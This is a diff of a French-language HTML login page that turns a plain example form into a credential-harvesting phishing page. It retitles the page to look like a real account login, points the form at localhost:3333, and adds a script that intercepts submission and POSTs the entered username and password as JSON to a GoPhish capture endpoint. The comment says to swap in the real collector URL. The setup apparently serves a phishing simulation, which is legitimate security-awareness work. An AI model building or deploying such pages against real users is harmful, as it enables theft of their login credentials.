@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Page de connexion - Exemple</title>
+    <title>Se connecter à votre compte</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -67,12 +67,38 @@
 <body>
     <div class="container">
         <h1>Se connecter à votre compte</h1>
-        <form action="#" method="post">
+        <form action="http://localhost:3333" method="POST" id="login-form">
             <input type="text" id="username" name="username" placeholder="Adresse e-mail ou numéro de téléphone" required>
             <input type="password" id="password" name="password" placeholder="Mot de passe" required>
             <button type="submit">Se connecter</button>
         </form>
         <p><a href="#">Mot de passe oublié ?</a></p>
     </div>
+
+    <script>
+        // Ajouter un écouteur d'événements pour envoyer les données à GoPhish
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Envoi des données à GoPhish (remplacer par l'URL GoPhish pour capturer les données)
+            fetch('http://localhost:3333/api/capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: username,
+                    password: password,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Données envoyées à GoPhish:', data);
+            })
+            .catch(error => console.error('Erreur:', error));
+        });
+    </script>
 </body>
 </html>
